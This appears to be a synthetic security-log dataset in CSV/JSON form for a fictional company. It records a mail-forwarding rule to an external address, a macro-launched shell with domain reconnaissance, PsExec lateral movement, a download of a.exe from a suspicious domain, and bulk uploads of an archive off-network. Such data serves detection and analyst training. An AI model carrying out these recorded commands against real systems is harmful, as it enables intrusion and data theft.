@timestamp,event.dataset,event.action,host.name,host.ip,user.name,source.ip,destination.ip,destination.port,url.full,process.name,process.command_line,file.path,file.hash.sha256,email.subject,raw,json
2024-11-03T08:47:50Z,identity,graph_api_call,,,alice.smith,91.219.236.87,,,https://graph.microsoft.com/v1.0/me/messages?$top=25,,,,,,GraphAPI: GET /me/messages by Secure Mail Reader ip=91.219.236.87 result=200,"{""@timestamp"": ""2024-11-03T08:47:50Z"", ""event"": {""dataset"": ""identity"", ""action"": ""graph_api_call"", ""kind"": ""event"", ""category"": [""authentication""], ""outcome"": ""success""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""GraphAPI: GET /me/messages by Secure Mail Reader ip=91.219.236.87 result=200"", ""user"": {""name"": ""alice.smith"", ""email"": null}, ""source"": {""ip"": ""91.219.236.87""}, ""service"": {""name"": ""Secure Mail Reader""}, ""http"": {""request"": {""method"": ""GET""}}, ""url"": {""full"": ""https://graph.microsoft.com/v1.0/me/messages?$top=25""}}"
2024-11-03T08:48:30Z,identity,graph_api_call,,,alice.smith,91.219.236.87,,,https://graph.microsoft.com/v1.0/me/messages?$top=25,,,,,,GraphAPI: GET /me/messages by Secure Mail Reader ip=91.219.236.87 result=200,"{""@timestamp"": ""2024-11-03T08:48:30Z"", ""event"": {""dataset"": ""identity"", ""action"": ""graph_api_call"", ""kind"": ""event"", ""category"": [""authentication""], ""outcome"": ""success""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""GraphAPI: GET /me/messages by Secure Mail Reader ip=91.219.236.87 result=200"", ""user"": {""name"": ""alice.smith"", ""email"": null}, ""source"": {""ip"": ""91.219.236.87""}, ""service"": {""name"": ""Secure Mail Reader""}, ""http"": {""request"": {""method"": ""GET""}}, ""url"": {""full"": ""https://graph.microsoft.com/v1.0/me/messages?$top=25""}}"
2024-11-03T08:49:10Z,identity,graph_api_call,,,alice.smith,91.219.236.87,,,https://graph.microsoft.com/v1.0/me/messages?$top=25,,,,,,GraphAPI: GET /me/messages by Secure Mail Reader ip=91.219.236.87 result=200,"{""@timestamp"": ""2024-11-03T08:49:10Z"", ""event"": {""dataset"": ""identity"", ""action"": ""graph_api_call"", ""kind"": ""event"", ""category"": [""authentication""], ""outcome"": ""success""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""GraphAPI: GET /me/messages by Secure Mail Reader ip=91.219.236.87 result=200"", ""user"": {""name"": ""alice.smith"", ""email"": null}, ""source"": {""ip"": ""91.219.236.87""}, ""service"": {""name"": ""Secure Mail Reader""}, ""http"": {""request"": {""method"": ""GET""}}, ""url"": {""full"": ""https://graph.microsoft.com/v1.0/me/messages?$top=25""}}"
2024-11-03T08:49:50Z,identity,graph_api_call,,,alice.smith,91.219.236.87,,,https://graph.microsoft.com/v1.0/me/messages?$top=25,,,,,,GraphAPI: GET /me/messages by Secure Mail Reader ip=91.219.236.87 result=200,"{""@timestamp"": ""2024-11-03T08:49:50Z"", ""event"": {""dataset"": ""identity"", ""action"": ""graph_api_call"", ""kind"": ""event"", ""category"": [""authentication""], ""outcome"": ""success""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""GraphAPI: GET /me/messages by Secure Mail Reader ip=91.219.236.87 result=200"", ""user"": {""name"": ""alice.smith"", ""email"": null}, ""source"": {""ip"": ""91.219.236.87""}, ""service"": {""name"": ""Secure Mail Reader""}, ""http"": {""request"": {""method"": ""GET""}}, ""url"": {""full"": ""https://graph.microsoft.com/v1.0/me/messages?$top=25""}}"
2024-11-03T08:50:30Z,identity,graph_api_call,,,alice.smith,91.219.236.87,,,https://graph.microsoft.com/v1.0/me/messages?$top=25,,,,,,GraphAPI: GET /me/messages by Secure Mail Reader ip=91.219.236.87 result=200,"{""@timestamp"": ""2024-11-03T08:50:30Z"", ""event"": {""dataset"": ""identity"", ""action"": ""graph_api_call"", ""kind"": ""event"", ""category"": [""authentication""], ""outcome"": ""success""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""GraphAPI: GET /me/messages by Secure Mail Reader ip=91.219.236.87 result=200"", ""user"": {""name"": ""alice.smith"", ""email"": null}, ""source"": {""ip"": ""91.219.236.87""}, ""service"": {""name"": ""Secure Mail Reader""}, ""http"": {""request"": {""method"": ""GET""}}, ""url"": {""full"": ""https://graph.microsoft.com/v1.0/me/messages?$top=25""}}"
2024-11-03T08:51:05Z,email,mailbox_rule_created,,,alice.smith,,,,,,,,,Rule: Forward All,EXO: New-InboxRule Name='Forward All' ForwardTo='external.audit@proton.me',"{""@timestamp"": ""2024-11-03T08:51:05Z"", ""event"": {""dataset"": ""email"", ""action"": ""mailbox_rule_created"", ""kind"": ""event"", ""category"": [""email""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EXO: New-InboxRule Name='Forward All' ForwardTo='external.audit@proton.me'"", ""user"": {""name"": ""alice.smith"", ""email"": null}, ""email"": {""from"": {""address"": [""alice.smith@company.com""]}, ""to"": {""address"": [""alice.smith@company.com""]}, ""subject"": ""Rule: Forward All"", ""message_id"": ""<rule-event-002@o365>""}}"
2024-11-06T20:05:12Z,endpoint,process_start,WKSTN-031,10.10.31.19,bchan,,,,,winword.exe,WINWORD.EXE /n invoice.docm,,,,Sysmon EID=1 Image=winword.exe ParentImage=explorer.exe CommandLine=WINWORD.EXE /n invoice.docm,"{""@timestamp"": ""2024-11-06T20:05:12Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Sysmon EID=1 Image=winword.exe ParentImage=explorer.exe CommandLine=WINWORD.EXE /n invoice.docm"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""process"": {""name"": ""winword.exe"", ""pid"": 2100, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""WINWORD.EXE /n invoice.docm""}}"
2024-11-06T20:05:25Z,endpoint,process_start,WKSTN-031,10.10.31.19,bchan,,,,,cmd.exe,"cmd.exe /c ""whoami && ipconfig /all""",,,,Sysmon EID=1 Image=cmd.exe ParentImage=winword.exe CommandLine=cmd.exe /c whoami,"{""@timestamp"": ""2024-11-06T20:05:25Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Sysmon EID=1 Image=cmd.exe ParentImage=winword.exe CommandLine=cmd.exe /c whoami"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""process"": {""name"": ""cmd.exe"", ""pid"": 2210, ""parent"": {""name"": ""winword.exe"", ""pid"": 2100}, ""command_line"": ""cmd.exe /c \""whoami && ipconfig /all\""""}}"
2024-11-06T20:05:26Z,terminal,command,WKSTN-031,10.10.31.19,bchan,,,,,,,,,,"2024-11-06T20:05:26Z bchan@WKSTN-031$ whoami
examplecorp\bchan","{""@timestamp"": ""2024-11-06T20:05:26Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-06T20:05:26Z bchan@WKSTN-031$ whoami\nexamplecorp\\bchan"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""terminal"": {""command"": ""whoami"", ""output"": ""examplecorp\\bchan""}}"
2024-11-06T20:05:28Z,terminal,command,WKSTN-031,10.10.31.19,bchan,,,,,,,,,,"2024-11-06T20:05:28Z bchan@WKSTN-031$ ipconfig /all
IPv4 Address. . . . . . : 10.10.31.19","{""@timestamp"": ""2024-11-06T20:05:28Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-06T20:05:28Z bchan@WKSTN-031$ ipconfig /all\nIPv4 Address. . . . . . : 10.10.31.19"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""terminal"": {""command"": ""ipconfig /all"", ""output"": ""IPv4 Address. . . . . . : 10.10.31.19""}}"
2024-11-06T20:07:00Z,endpoint,process_start,WKSTN-031,10.10.31.19,bchan,,,,,powershell.exe,"powershell.exe -NoP -W Hidden ""Get-ChildItem Env: | Out-String""",,,,EDR: suspicious PowerShell env enumeration,"{""@timestamp"": ""2024-11-06T20:07:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: suspicious PowerShell env enumeration"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 2330, ""parent"": {""name"": ""cmd.exe"", ""pid"": 2210}, ""command_line"": ""powershell.exe -NoP -W Hidden \""Get-ChildItem Env: | Out-String\""""}}"
2024-11-06T20:07:26Z,terminal,command,WKSTN-031,10.10.31.19,bchan,,,,,,,,,,"2024-11-06T20:07:26Z bchan@WKSTN-031$ net view /domain
(output truncated)","{""@timestamp"": ""2024-11-06T20:07:26Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-06T20:07:26Z bchan@WKSTN-031$ net view /domain\n(output truncated)"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""terminal"": {""command"": ""net view /domain"", ""output"": ""(output truncated)""}}"
2024-11-06T20:07:20Z,terminal,command,WKSTN-031,10.10.31.19,bchan,,,,,,,,,,"2024-11-06T20:07:20Z bchan@WKSTN-031$ net group ""Domain Admins"" /domain
(output truncated)","{""@timestamp"": ""2024-11-06T20:07:20Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-06T20:07:20Z bchan@WKSTN-031$ net group \""Domain Admins\"" /domain\n(output truncated)"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""terminal"": {""command"": ""net group \""Domain Admins\"" /domain"", ""output"": ""(output truncated)""}}"
2024-11-06T20:07:38Z,terminal,command,WKSTN-031,10.10.31.19,bchan,,,,,,,,,,"2024-11-06T20:07:38Z bchan@WKSTN-031$ nltest /dclist:examplecorp
(output truncated)","{""@timestamp"": ""2024-11-06T20:07:38Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-06T20:07:38Z bchan@WKSTN-031$ nltest /dclist:examplecorp\n(output truncated)"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""terminal"": {""command"": ""nltest /dclist:examplecorp"", ""output"": ""(output truncated)""}}"
2024-11-06T20:09:00Z,network,flow,WKSTN-031,10.10.31.19,bchan,10.10.31.19,10.10.5.10,445,,,,,,,ZEek conn.log: id.orig_h=10.10.31.19 id.resp_h=10.10.5.10 id.resp_p=445 proto=tcp service=smb,"{""@timestamp"": ""2024-11-06T20:09:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""ZEek conn.log: id.orig_h=10.10.31.19 id.resp_h=10.10.5.10 id.resp_p=445 proto=tcp service=smb"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""destination"": {""ip"": ""10.10.5.10"", ""port"": 445}, ""network"": {""transport"": ""tcp"", ""bytes"": 6144}}"
2024-11-06T20:09:10Z,endpoint,process_start,WKSTN-031,10.10.31.19,bchan,,,,,psexec.exe,psexec.exe \\SRV-FILE-01 -u EXAMPLECORP\svc_backup -p ******** cmd.exe /c whoami,,,,EDR: Tool execution psexec.exe,"{""@timestamp"": ""2024-11-06T20:09:10Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: Tool execution psexec.exe"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""process"": {""name"": ""psexec.exe"", ""pid"": 2501, ""parent"": {""name"": ""cmd.exe"", ""pid"": 2210}, ""command_line"": ""psexec.exe \\\\SRV-FILE-01 -u EXAMPLECORP\\svc_backup -p ******** cmd.exe /c whoami""}}"
2024-11-06T20:09:14Z,endpoint,service_install,SRV-FILE-01,10.10.5.10,svc_backup,,,,,,,,,,Windows Security 7045: A service was installed in the system. Service Name=PSEXESVC ImagePath=C:\Windows\PSEXESVC.exe,"{""@timestamp"": ""2024-11-06T20:09:14Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""service_install"", ""kind"": ""event""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Windows Security 7045: A service was installed in the system. Service Name=PSEXESVC ImagePath=C:\\Windows\\PSEXESVC.exe"", ""host"": {""name"": ""SRV-FILE-01"", ""ip"": [""10.10.5.10""]}, ""user"": {""name"": ""svc_backup"", ""email"": null}}"
2024-11-06T20:09:18Z,endpoint,process_start,SRV-FILE-01,10.10.5.10,svc_backup,,,,,cmd.exe,"cmd.exe /c ""whoami && dir C:\Shares\Finance\Q4""",,,,Sysmon: remote cmd executed under svc_backup,"{""@timestamp"": ""2024-11-06T20:09:18Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Sysmon: remote cmd executed under svc_backup"", ""host"": {""name"": ""SRV-FILE-01"", ""ip"": [""10.10.5.10""]}, ""user"": {""name"": ""svc_backup"", ""email"": null}, ""process"": {""name"": ""cmd.exe"", ""pid"": 3100, ""parent"": {""name"": ""services.exe"", ""pid"": 700}, ""command_line"": ""cmd.exe /c \""whoami && dir C:\\Shares\\Finance\\Q4\""""}}"
2024-11-06T20:09:19Z,terminal,command,SRV-FILE-01,10.10.5.10,svc_backup,,,,,,,,,,"2024-11-06T20:09:19Z svc_backup@SRV-FILE-01$ whoami
examplecorp\svc_backup","{""@timestamp"": ""2024-11-06T20:09:19Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-06T20:09:19Z svc_backup@SRV-FILE-01$ whoami\nexamplecorp\\svc_backup"", ""host"": {""name"": ""SRV-FILE-01"", ""ip"": [""10.10.5.10""]}, ""user"": {""name"": ""svc_backup"", ""email"": null}, ""terminal"": {""command"": ""whoami"", ""output"": ""examplecorp\\svc_backup""}}"
2024-11-06T20:11:00Z,network,http,WKSTN-031,10.10.31.19,bchan,10.10.31.19,104.244.75.23,80,http://cdn-assets-update.com/a.exe,,,,,,PROXY: GET http://cdn-assets-update.com/a.exe status=200,"{""@timestamp"": ""2024-11-06T20:11:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""PROXY: GET http://cdn-assets-update.com/a.exe status=200"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""destination"": {""ip"": ""104.244.75.23"", ""port"": 80}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 120600}, ""http"": {""request"": {""method"": ""GET""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""http://cdn-assets-update.com/a.exe""}, ""user_agent"": {""original"": ""Mozilla/5.0""}}"
2024-11-06T20:11:05Z,endpoint,file_write,WKSTN-031,10.10.31.19,bchan,,,,,,,C:\Users\bchan\AppData\Local\Temp\a.exe,d1c2b3a4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0,,EDR: FileWrite Temp\a.exe sha256=...,"{""@timestamp"": ""2024-11-06T20:11:05Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: FileWrite Temp\\a.exe sha256=..."", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\bchan\\AppData\\Local\\Temp\\a.exe"", ""hash"": {""sha256"": ""d1c2b3a4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0""}}}"
2024-11-06T20:13:00Z,network,flow,SRV-FILE-01,10.10.5.10,svc_backup,10.10.5.10,10.10.0.10,445,,,,,,,Firewall: BLOCK outbound SMB from SRV-FILE-01 to SRV-DC-01,"{""@timestamp"": ""2024-11-06T20:13:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Firewall: BLOCK outbound SMB from SRV-FILE-01 to SRV-DC-01"", ""host"": {""name"": ""SRV-FILE-01"", ""ip"": [""10.10.5.10""]}, ""user"": {""name"": ""svc_backup"", ""email"": null}, ""source"": {""ip"": ""10.10.5.10""}, ""destination"": {""ip"": ""10.10.0.10"", ""port"": 445}, ""network"": {""transport"": ""tcp"", ""bytes"": 512}}"
2024-11-10T14:01:05Z,endpoint,process_start,WKSTN-022,10.10.22.44,asmith,,,,,7z.exe,"7z.exe a -tzip ""C:\Users\asmith\Documents\client_data.rar"" ""C:\Users\asmith\Documents\ClientData\*""",,,,EDR: archive creation detected,"{""@timestamp"": ""2024-11-10T14:01:05Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: archive creation detected"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""process"": {""name"": ""7z.exe"", ""pid"": 5200, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""7z.exe a -tzip \""C:\\Users\\asmith\\Documents\\client_data.rar\"" \""C:\\Users\\asmith\\Documents\\ClientData\\*\""""}}"
2024-11-10T14:01:40Z,endpoint,file_write,WKSTN-022,10.10.22.44,asmith,,,,,,,C:\Users\asmith\Documents\client_data.rar,0f1e2d3c4b5a69788796a5b4c3d2e1f0aa55bb66cc77dd88ee99ff0011223344,,FileWrite: client_data.rar sha256=... size=184MB,"{""@timestamp"": ""2024-11-10T14:01:40Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FileWrite: client_data.rar sha256=... size=184MB"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\asmith\\Documents\\client_data.rar"", ""hash"": {""sha256"": ""0f1e2d3c4b5a69788796a5b4c3d2e1f0aa55bb66cc77dd88ee99ff0011223344""}}}"
2024-11-10T14:02:00Z,network,dns,WKSTN-022,10.10.22.44,asmith,10.10.22.44,,,,,,,,,DNS: first_seen query=fileshare-sync.net answer=193.29.13.88,"{""@timestamp"": ""2024-11-10T14:02:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: first_seen query=fileshare-sync.net answer=193.29.13.88"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""dns"": {""question"": {""name"": ""fileshare-sync.net""}, ""answers"": [{""data"": ""193.29.13.88"", ""ttl"": 120}]}}"
2024-11-10T14:03:10Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,193.29.13.88,443,,,,,,,TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000,"{""@timestamp"": ""2024-11-10T14:03:10Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""193.29.13.88"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 8200000}}"
2024-11-10T14:03:40Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,193.29.13.88,443,,,,,,,TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000,"{""@timestamp"": ""2024-11-10T14:03:40Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""193.29.13.88"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 8200000}}"
2024-11-10T14:04:10Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,193.29.13.88,443,,,,,,,TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000,"{""@timestamp"": ""2024-11-10T14:04:10Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""193.29.13.88"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 8200000}}"
2024-11-10T14:04:40Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,193.29.13.88,443,,,,,,,TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000,"{""@timestamp"": ""2024-11-10T14:04:40Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""193.29.13.88"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 8200000}}"
2024-11-10T14:05:10Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,193.29.13.88,443,,,,,,,TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000,"{""@timestamp"": ""2024-11-10T14:05:10Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""193.29.13.88"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 8200000}}"
2024-11-10T14:05:40Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,193.29.13.88,443,,,,,,,TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000,"{""@timestamp"": ""2024-11-10T14:05:40Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""193.29.13.88"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 8200000}}"
2024-11-10T14:06:10Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,193.29.13.88,443,,,,,,,TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000,"{""@timestamp"": ""2024-11-10T14:06:10Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""193.29.13.88"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 8200000}}"
2024-11-10T14:06:40Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,193.29.13.88,443,,,,,,,TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000,"{""@timestamp"": ""2024-11-10T14:06:40Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: sni=fileshare-sync.net bytes_out=8000000 bytes_in=200000"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""193.29.13.88"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 8200000}}"
